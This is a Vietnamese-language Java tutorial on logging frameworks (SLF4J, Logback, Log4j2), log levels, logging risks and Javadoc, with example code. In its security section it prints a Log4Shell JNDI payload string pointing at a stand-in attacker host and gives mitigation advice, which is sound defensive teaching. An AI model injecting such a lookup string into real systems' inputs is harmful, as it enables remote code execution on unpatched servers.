# [16] Phase 7 - Ecosystem: Logging Frameworks (Logback, Log4j2, SLF4J) & Javadoc

## 1. Nguồn gốc và lý do ra đời của Logging Facade

### Sự bất cập của việc in log thô (`System.out.println`)
Trong các ứng dụng thực tế chạy trên Production, việc sử dụng lệnh `System.out.println()` là một lỗi thiết kế nghiêm trọng:
- **Hạn chế**: 
  - Lệnh này ghi thẳng vào luồng đầu ra tiêu chuẩn (stdout) một cách đồng bộ (blocking), làm chậm đáng kể hiệu năng ứng dụng.
  - Không thể cấu hình phân cấp lọc log (ví dụ: chỉ in log lỗi nguy hiểm khi chạy Production, in log chi tiết khi debug ở môi trường Local).
  - Không thể tự động ghi log vào tệp, chia tệp theo ngày (log rotation) hoặc đẩy về hệ thống giám sát tập trung (ELK Stack).

### Giải pháp: Mẫu thiết kế Facade (SLF4J) & Các thư viện Logging
Để giải quyết bài toán trên, cộng đồng Java thống nhất sử dụng:
- **SLF4J (Simple Logging Facade for Java)**: Không trực tiếp ghi log. SLF4J đóng vai trò là một giao diện trừu tượng (Facade Pattern). Nó bọc ngoài các thư viện log thực tế, cho phép bạn đổi thư viện log bên dưới (từ Logback sang Log4j2) mà không cần sửa bất kỳ dòng code Java nào.
- **Logback**: Bộ thư viện ghi log mặc định của Spring Boot, hiệu năng cao và cấu hình linh hoạt qua tệp XML.
- **Log4j2**: Thư viện ghi log mạnh mẽ của Apache, nổi tiếng với khả năng ghi log bất đồng bộ (Asynchronous Loggers) bằng cấu trúc dữ liệu LMAX Disruptor không chặn khóa.

---

## 2. So sánh các mức độ ghi Log (Log Levels)

Ghi log đúng mức độ giúp đội ngũ vận hành (Ops) nhanh chóng phát hiện lỗi mà không làm tràn ngập ổ đĩa:

1. **TRACE**: Log chi tiết nhất, ghi lại từng bước chạy của luồng code. Chỉ bật khi debug các ca cực kỳ phức tạp.
2. **DEBUG**: Thông tin hữu ích cho lập trình viên khi phát triển (ví dụ: giá trị của tham số truyền vào hàm).
3. **INFO**: Ghi lại các sự kiện lớn diễn ra thành công (ví dụ: "Máy chủ khởi động thành công trên cổng 8080", "Người dùng A đăng nhập").
4. **WARN**: Các cảnh báo bất thường nhưng hệ thống vẫn tiếp tục chạy được (ví dụ: "Kết nối DB bị chậm quá 1 giây").
5. **ERROR**: Lỗi nghiêm trọng khiến một yêu cầu/giao dịch bị thất bại (ví dụ: Lỗi ném ra ngoại lệ NullPointerException, thất bại khi ghi file).

---

## 3. Rủi ro bảo mật và hiệu năng từ Logging

1. **Lỗ hổng bảo mật nghiêm trọng (Log4Shell - CVE-2021-44228)**: Xảy ra trong Log4j2 do cơ chế tự động phân tích cú pháp chuỗi log chứa lookup JNDI (`${jndi:ldap://attacker.com/a}`). Kẻ tấn công có thể chèn chuỗi này qua Input User (như User-Agent), Log4j2 ghi log chuỗi này và tự động tải mã độc từ xa về thực thi, chiếm toàn bộ quyền kiểm soát máy chủ.
   - *Khắc phục*: Luôn cập nhật thư viện Log4j2 lên phiên bản mới nhất, tắt cơ chế lookup không an toàn.
2. **Nghẽn I/O do ghi Log quá nhiều**: Ghi log đồng bộ quá dày đặc (ví dụ: ghi log DEBUG trong vòng lặp hàng triệu phần tử) sẽ chặn đứng luồng CPU và làm cạn kiệt băng thông ổ đĩa (Disk I/O).
   - *Khắc phục*: Sử dụng ghi log bất đồng bộ (Async Loggers) và cấu hình Log level phù hợp cho từng môi trường (môi trường Production nên để INFO hoặc WARN).

---

## 4. Code ví dụ minh họa chi tiết

### a) Viết Javadoc chuẩn hóa tài liệu kỹ thuật
```java
/**
 * Lớp tiện ích cung cấp dịch vụ quản lý tài khoản người dùng.
 * <p>
 * Ví dụ sử dụng:
 * <pre>
 *     UserService service = new UserService();
 *     service.registerUser("hoang", "password");
 * </pre>
 *
 * @author DangQuangSE
 * @version 1.0
 * @since Java 17
 */
public class UserService {

    /**
     * Đăng ký một tài khoản mới vào hệ thống.
     *
     * @param username tên tài khoản của người dùng, không được để trống
     * @param password mật khẩu người dùng, tối thiểu phải có 8 ký tự
     * @return true nếu đăng ký thành công, ngược lại trả về false
     * @throws IllegalArgumentException nếu dữ liệu đầu vào không hợp lệ
     */
    public boolean registerUser(String username, String password) {
        if (username == null || password == null || password.length() < 8) {
            throw new IllegalArgumentException("Dữ liệu đăng ký không hợp lệ!");
        }
        return true;
    }
}
```

### b) Sử dụng SLF4J Facade để ghi Log (Tiêu chuẩn công nghiệp)
```java
// Cần import các class từ org.slf4j
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class LogDemo {
    // Khai báo Logger tĩnh của SLF4J
    private static final Logger log = LoggerFactory.getLogger(LogDemo.class);

    public static void main(String[] args) {
        String username = "hoang_admin";

        // Sử dụng cấu trúc chuỗi "{}" để tránh lãng phí chi phí nối chuỗi khi log level bị tắt
        log.info("Bắt đầu xử lý đăng nhập cho người dùng: {}", username);

        try {
            int result = 10 / 0; // Giả lập lỗi runtime
        } catch (ArithmeticException e) {
            // Khi ghi log Exception, luôn truyền Exception làm tham số cuối cùng để in đầy đủ StackTrace
            log.error("Thực hiện phép tính thất bại cho user: {}", username, e);
        }
    }
}
```
